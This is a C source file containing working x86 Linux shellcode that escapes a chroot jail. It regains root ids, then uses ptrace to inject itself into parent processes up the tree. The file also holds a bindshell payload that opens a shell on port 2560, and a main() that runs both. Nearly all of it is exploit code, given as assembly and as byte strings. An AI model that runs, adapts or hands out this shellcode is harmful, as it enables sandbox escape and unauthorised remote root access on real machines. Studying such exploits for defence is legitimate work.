/*
	ptrace-chrootbreak shellcode, 95 bytes
	
	Since 2.4.14 kernel, linus stopped playing dir tricks
	to leave chroot()-ed area. However, mknod() and ptrace()
	can be still used to do so.

	Algo:
	1.	Try to regain uid/euid/gid/egid = 0, for case
		that CAP_SYS_PTRACE is dropped. Also block
		all signals, because some daemons would like
		to die after SIGCHLD/SIGTRAP being received.
	2.	Try attach to parent process in hope that
		it is outside chroot(), if failed to do so,
		we should be top process, so execute final shellcode.
	3.	Get EIP of parent, and through PTRACE_POKETEXT
		overwrite .text of parent with our own copy
		at EIP location.
	4.	Detach from parent and let it run our code from
		step 1. Current process will exit().

	By that way, we'll follow execution tree, so it should
	work from any depth. Final shellcode will be executed
	in case of error (i.e. ppid == 1) from the thread at the
	top of process tree, which will be with some opportunity
	outside chroot. Whoa.

	However, this cannot be used against local execve,
	because we're losing TTY. You need to use
	some bind/connect dup()-ing shellcode.
*/

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#define BINDPORT 2560

/*
asm("
	.data
	.p2align 0
	.align	0
ptrace_break:
	jmp	jumpover
getdelta:

# setreuid(0, 0) & setregid(0, 0)  ... just to be sure :)
	pushl	$70
	popl	%eax
	xorl	%ebx, %ebx
	xorl	%ecx, %ecx
	int	$0x80
	mov	$71, %al
	int	$0x80

# ignore all signals, because some daemons
# tends to do some odd stuff after SIGCHLD being received
	mov	$69, %al
	dec	%ebx
	int	$0x80

# getppid
	pushl	$64
	popl	%eax
	int	$0x80
	xchg	%eax, %ecx

# try attach
	mov	$26, %al
	pushl	$0x10
	popl	%ebx
	int	$0x80

	test	%eax, %eax
	jnz	scode

waitforthing:
	pushal
	movb	$7, %al
	movl	%ecx, %ebx
	xorl	%ecx, %ecx
	pushl	$2
	popl	%edx
	int	$0x80
	popal

# get eip of parent
getregs:
	popl	%edi
	pushl	%eax
	movl	%esp, %esi
	mov	$26, %al
	mov	$3, %bl
	pushl	$12*4
	popl	%edx
	int	$0x80
	popl	%edx

# well, now do some little harm; put us
# at parent's eip :)
	.byte	0x83, 0xef		# subl	$(scode-ptrace_break), %edi
	.byte	(scode-ptrace_break)
	movb	$4, %bl
fuck_parent:
	movb	$26, %al
	movl	(%edi), %esi
	int	$0x80
	incl	%edi
	incl	%edx
	shl	$24, %esi
	jnz	fuck_parent

# detach and wake up parent
# (data - %esi is always zero)
detachthing:
	mov	$26, %al
	movb	$0x11, %bl
	int	$0x80
	inc	%eax
	int	$0x80
jumpover:
	call	getdelta
scode:
	.byte	0
");

extern	void ptrace_break();
extern	void ptrace_break_end();
extern	unsigned char wport[2];
*/

/* our ptrace-break shellcode */
unsigned char cbreak[] =
	"\xeb\x58\x6a\x46\x58\x31\xdb\xcd\x80\xb0\x47\xcd\x80\xb0\x45\x4b"
	"\xcd\x80\x6a\x40\x58\xcd\x80\x91\x6a\x1a\x58\x6a\x10\x5b\xcd\x80"
	"\x85\xc0\x75\x3b\x60\xb0\x07\x89\xcb\x31\xc9\x6a\x02\x5a\xcd\x80"
	"\x61\x5f\x50\x89\xe6\xb0\x1a\xb3\x03\x6a\x30\x5a\xcd\x80\x5a\x83"
	"\xef\x5f\xb3\x04\xb0\x1a\x8b\x37\xcd\x80\x47\x42\xc1\xe6\x18\x75"
	"\xf3\xb0\x1a\xb3\x11\xcd\x80\x40\xcd\x80\xe8\xa3\xff\xff\xff";

/* classic bindshell */
unsigned char bind[84] =
	"\x6a\x66\x58\x31\xdb\x53\x43\x53"
	"\x6a\x02\x89\xe1\xcd\x80\x43\x31"
	"\xc9\x51\xb5\x0a\x0f\xc9\x09\xd9" /* 0x0a * 256 = port 2560 */
	"\x51\x89\xe6\x6a\x10\x56\x50\x6a"
	"\x66\x58\x89\xe1\xcd\x80\xb0\x66"
	"\x43\x43\xcd\x80\x89\x64\x24\x08"
	"\xb0\x66\x43\xcd\x80\x93\x91\x6a"
	"\x3f\x58\xcd\x80\x49\x79\xf8\x50"
	"\x68\x6e\x2f\x73\x68\x68\x2f\x2f"
	"\x62\x69\x89\xe3\x50\x53\x89\xe1"
	"\xb0\x0b\xcd\x80";


int	main()
{
	char	buf[512];
	void		(*breakchroot)() = (void *) buf;

	/* setup port to bind */
	bind[19] = BINDPORT / 256;

	/* build resulting code */
	sprintf(buf, "%s%s", cbreak, bind);
	
	printf(	"chroot break code length ... %d\n"
		"portshell code length ...... %d\n"
		"total shellcode length ..... %d\n",
		strlen(cbreak), strlen(bind), strlen(buf));

	printf(	"\nNow, we'll execute shellcode\n"
		"Note that your current tty/remote session will\n"
		"be lost.\n"
		"Portshell will be at port %d\n"
		"Hit enter to continue, ^C to break\n", BINDPORT & ~0xff);

	getchar();
	breakchroot();

	/* NOT REACHED */
	return 0;
}
